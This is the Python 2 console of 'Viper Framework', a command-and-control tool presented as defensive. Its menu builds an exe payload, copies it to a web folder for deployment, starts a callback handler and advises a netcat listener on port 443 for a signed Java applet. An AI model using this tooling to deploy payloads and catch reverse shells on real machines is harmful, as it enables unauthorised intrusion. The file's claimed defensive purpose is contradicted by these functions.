#!/usr/bin/python


import subprocess
import os
import sys
import readline
import modules.handler.ViperServer as viperserver
import commands
import platform


sys.dont_write_bytecode = True

"""
1. This is python framework designed to control agents that get deployed on computers in defense of exploitation frameworks!
2. The framework is designed in order to detect compromised files, processes, and services in order to grab or kill the malware. 
3. This framework can also be used for testing exploitation and enumeration for the purpose of learning offensive for defensible actions. 


"""


def banner():
    print """

    Name : Viper Framework by Black Signals
    Date : 03 March 17
    Version : v1.0

#   __   _____ ___ ___ ___    ___ ___    _   __  __ _____      _____  ___ _  __    _ _   
#   \ \ / /_ _| _ \ __| _ \  | __| _ \  /_\ |  \/  | __\ \    / / _ \| _ \ |/ /  _| | |_  #
#    \ V / | ||  _/ _||   /  | _||   / / _ \| |\/| | _| \ \/\/ / (_) |   / ' <  |_  .  _| #
#     \_/ |___|_| |___|_|_\  |_| |_|_\/_/ \_\_|  |_|___| \_/\_/ \___/|_|_\_|\_\ |_     _| #
#                                                                                 |_|_|   #
                    Going low and slow

$ Viper>> help for help
"""

def menu():
    """This is the program menu"""
    print "[*] Command options: "
    print
    print "[*] handler ========= > starts the viper server and waits for a call back" 
    print "[*] client2exe ========= > builds a exe payload and stores it inside payloads and www/html for deployment"
    print "[*] teamserver ,chat server, chat stop  ========= > starts the team server, chat factory and console : todo" 
    print "[*] startweb ========= > starts the webserver" 
    print "[*] stopweb ========= > stops the webserver" 
    print "[*] ??????? ========= > " 
    print "\n"



def console():
    while(True):
        command = raw_input('$ Viper>> ')
        #command = command.split(" ") 
        
        if "help" in command:
            for x in command:
                 x = "help"
                 print("[+] here is the help ")
                 menu()
                 break 
        
        if 'ls' in command:
            dirlist = os.listdir(".")
            print(dirlist)

        elif 'cd' in command:
                    for x in command:
                        if 'cd*' in x:
                            code, command = command.split("*")
                            os.chdir(command)
                            print ("[+] CWD Is " + os.getcwd())

                        elif 'cd' in command:
                            code, command = command.split(" ")
                            os.chdir(command)
                            print ("[+] CWD Is " + os.getcwd())

        if 'dir' in command:
            dirlist = os.listdir(".")
            print(dirlist)
        
        elif 'handler' in command:
            print ( "[+] Starting server standby " + viperserver.main())
        
        elif 'client2exe' in command:
            #subprocess.call("payloads/Client2exe.sh", stdin=None, stdout=None, stderr=None, shell=True)
            subprocess.call("payloads/Client2exe.sh 2>/dev/null", shell=True)
            print ( "[+] created the exe inside the payloads folder && copied payload to www/html")
            pass
            #banner()           
            #menu()
        elif 'teamserver' in command:
            os.system("./start-teamserver.sh  --pidfile application/services/teamserver.pid &")
            pass        
 
        elif 'chatserver' in command:
            os.system("twistd -ny application/services/chatserver.py  --pidfile application/services/chatserver.pid &")
            print ( "[+] chatserver reactor started")
            print ( "[+] created the chatserver please connect to server as host @ telnet 127.0.0.1 8123 username host")
            print ( "[*] remember for now you will have to manually kill the chat server type (stopchat) for commands to stop chat ")
            pass 
               
        elif 'stopchat' in command:
            print ( "[+] for now you will have to manually stop chatserver with the usual methods")
            print ( "[+] type in terminal ps aux | grep chatserver and then kill -9 pid")
            pass
            
        elif 'startweb' in command:
        		os.chdir("www/")
        		os.system("twistd web --path html/.")
        		os.chdir("../")
        		print "[*] - Starting the webserver reactor"
        		print "[*] - The webserver is listening on 127.0.0.1:8080"
        		print "[*] - The reactor is running"
        		print "[*] - If you deploy the java signed applet then start netcat listener first with nc -lvp 443"
        		pass   
            
        elif 'stopweb' in command:
        		os.chdir("www/")
        		os.system("kill `cat twistd.pid`")
        		os.chdir("../")
        		print "[*] - Stopping the webserver reactor"
        		print "[*] - The webserver shutting down"
        		print "[*] - The reactor is stopping"
        		pass            
        else:
            print('')

        
        

    
        
def main():
    banner()
    console()
    
if __name__ == "__main__":
    main()
        
